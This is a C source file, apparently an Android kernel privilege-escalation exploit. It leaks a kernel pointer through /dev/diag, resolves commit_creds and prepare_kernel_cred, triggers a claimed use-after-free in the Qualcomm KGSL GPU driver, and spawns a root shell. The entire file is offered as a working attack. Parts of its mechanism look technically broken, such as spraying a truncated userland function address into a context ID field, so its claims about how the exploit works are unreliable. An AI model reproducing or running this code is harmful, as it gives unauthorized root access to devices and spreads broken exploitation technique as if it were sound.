#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>

#define DIAG_DEVICE "/dev/diag"
#define KGSL_DEVICE "/dev/kgsl-3d0"

#define KGSL_IOCTL_TYPE 0x09
#define KGSL_DRAWCTXT_CREATE 0x10
#define KGSL_DRAWCTXT_DESTROY 0x11
#define KGSL_IOCTL_DRAWCTXT_CREATE _IOWR(KGSL_IOCTL_TYPE, KGSL_DRAWCTXT_CREATE, struct kgsl_drawctxt_create)
#define KGSL_IOCTL_DRAWCTXT_DESTROY _IOW(KGSL_IOCTL_TYPE, KGSL_DRAWCTXT_DESTROY, uint32_t)

struct kgsl_drawctxt_create {
    uint32_t flags;
    uint32_t priority;
    uint32_t drawctxt_id;
};

static uint64_t commit_creds = 0, prepare_kernel_cred = 0;
static int mem_fd = -1;

uint64_t leak_kernel_pointer_via_diag(void) {
    int fd = open(DIAG_DEVICE, O_RDWR);
    if (fd < 0) {
        fd = open(DIAG_DEVICE, O_RDONLY);
        if (fd < 0) return 0;
    }
    unsigned char buf[0x1000];
    ssize_t ret = read(fd, buf, sizeof(buf));
    close(fd);
    if (ret <= 0) return 0;
    for (int i = 0; i < ret - 8; i++) {
        uint64_t val = *(uint64_t*)(buf + i);
        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            if ((val & 0xfff) == 0) {
                printf("[!] Possible kernel symbol address: 0x%llx\n", (unsigned long long)val);
                return val;
            }
        }
    }
    return 0;
}

void resolve_symbols_from_offset(uint64_t base) {
    uint64_t offset_commit = 0, offset_prepare = 0;
    FILE *fp = fopen("/data/local/tmp/kallsyms.txt", "r");
    if (fp) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {
            uint64_t a;
            char type, sym[256];
            if (sscanf(line, "%lx %c %255s", &a, &type, sym) == 3) {
                if (strcmp(sym, "commit_creds") == 0) offset_commit = a;
                if (strcmp(sym, "prepare_kernel_cred") == 0) offset_prepare = a;
                if (offset_commit && offset_prepare) break;
            }
        }
        fclose(fp);
    }
    if (offset_commit && offset_prepare) {
        commit_creds = offset_commit;
        prepare_kernel_cred = offset_prepare;
        printf("[+] commit_creds = 0x%llx\n", (unsigned long long)commit_creds);
        printf("[+] prepare_kernel_cred = 0x%llx\n", (unsigned long long)prepare_kernel_cred);
    } else if (base) {
        commit_creds = base + 0x5a7b0;
        prepare_kernel_cred = base + 0x5a6e0;
        printf("[*] Using guessed addresses: commit_creds=0x%llx, prepare=0x%llx\n", (unsigned long long)commit_creds, (unsigned long long)prepare_kernel_cred);
    }
}

void get_root_payload(void) {
    void *(*pkc)(void*) = (void* (*)(void*))prepare_kernel_cred;
    void (*cc)(void*) = (void (*)(void*))commit_creds;
    if (pkc && cc) {
        cc(pkc(0));
        setresuid(0,0,0);
        setresgid(0,0,0);
        setgroups(0, NULL);
    }
}

void *trigger_uaf_thread(void *arg) {
    int kgsl_fd = *(int*)arg;
    struct kgsl_drawctxt_create ctx = {0};
    if (ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_CREATE, &ctx) < 0) return NULL;
    uint32_t ctx_id = ctx.drawctxt_id;
    ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_DESTROY, &ctx_id);
    for (int i = 0; i < 100; i++) {
        struct kgsl_drawctxt_create fake = {0};
        fake.drawctxt_id = (uint32_t)(uintptr_t)get_root_payload;
        ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_CREATE, &fake);
    }
    return NULL;
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    }
    printf("[*] Leaking kernel pointer via /dev/diag\n");
    uint64_t leaked = leak_kernel_pointer_via_diag();
    resolve_symbols_from_offset(leaked);
    if (!commit_creds || !prepare_kernel_cred) {
        printf("[-] Failed to resolve symbols. Exiting.\n");
        return 1;
    }
    printf("[*] Opening /dev/kgsl-3d0\n");
    int kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        perror("open kgsl");
        return 1;
    }
    printf("[*] Triggering KGSL UAF\n");
    pthread_t thr;
    pthread_create(&thr, NULL, trigger_uaf_thread, &kgsl_fd);
    pthread_join(thr, NULL);
    close(kgsl_fd);
    sleep(1);
    if (getuid() == 0) {
        printf("[+] Root shell\n");
        execl("/system/bin/sh", "sh", NULL);
    } else {
        printf("[-] Exploit failed. Try again.\n");
    }
    return 0;
}
